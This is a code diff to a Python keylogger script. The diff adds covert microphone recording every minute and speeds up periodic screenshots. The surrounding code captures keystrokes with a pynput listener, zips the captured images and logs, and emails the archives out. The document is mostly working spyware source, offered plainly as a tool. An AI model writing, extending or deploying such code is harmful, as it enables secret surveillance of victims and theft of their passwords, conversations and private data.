@@ -8,11 +8,23 @@ from email.mime.base import MIMEBase
 from email import encoders
 import zipfile
 import os
+import pyaudio
+import wave
 
-log = open("..\\..\\Logs\\log.txt", "w")
+
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+CHUNK = 1024
+RECORD_SECONDS = 5
+
+p = pyaudio.PyAudio()
+
+log = open("Logs\\log.txt", "w")
 
 image_counter = 1
 zip_counter = 1
+sound_counter = 1
 
 def callback_function(key):
     try:
@@ -92,8 +104,8 @@ def send_email(message):
 
 def thread_function():
     global zip_counter
-    folders=["..\\..\\Images","..\\..\\Logs"]
-    zip_name=f"..\\..\\Rar Files\\Log{zip_counter}.zip"
+    folders=["Images","Logs"]
+    zip_name=f"Rar Files\\Log{zip_counter}.zip"
     zip_counter +=1
     convert_zip(folders,zip_name)
     send_email(zip_name)
@@ -103,11 +115,40 @@ def thread_function():
 def take_screenshot():
     global image_counter
     ekran=pyautogui.screenshot()
-    ekran.save(f"..\\..\\Images\\ekran{image_counter}.jpg")
+    ekran.save(f"Images\\ekran{image_counter}.jpg")
     image_counter += 1
-    timer_object = threading.Timer(20,take_screenshot)
+    timer_object = threading.Timer(15,take_screenshot)
     timer_object.start()
 
+def save_sound():
+    global sound_counter
+
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    input=True,
+                    frames_per_buffer=CHUNK)
+
+    frames = []
+
+    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+        data = stream.read(CHUNK)
+        frames.append(data)
+
+    stream.stop_stream()
+    stream.close()
+
+    wf = wave.open(f"Audio/ses{sound_counter}.wav", 'wb')
+    wf.setnchannels(CHANNELS)
+    wf.setsampwidth(p.get_sample_size(FORMAT))
+    wf.setframerate(RATE)
+    wf.writeframes(b''.join(frames))
+    wf.close()
+
+    sound_counter += 1
+
+    timer_object = threading.Timer(60,save_sound)
+    timer_object.start()
     
 def convert_zip(kaynak_dosyalar, hedef_zip):
     with zipfile.ZipFile(hedef_zip, 'w', zipfile.ZIP_DEFLATED) as zipdosyasi:
@@ -121,9 +162,9 @@ def convert_zip(kaynak_dosyalar, hedef_zip):
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 with keylogger_listener:
     take_screenshot()
+    save_sound()
     thread_function()
     keylogger_listener.join()
 
 log.close()
-    
-
+p.terminate()
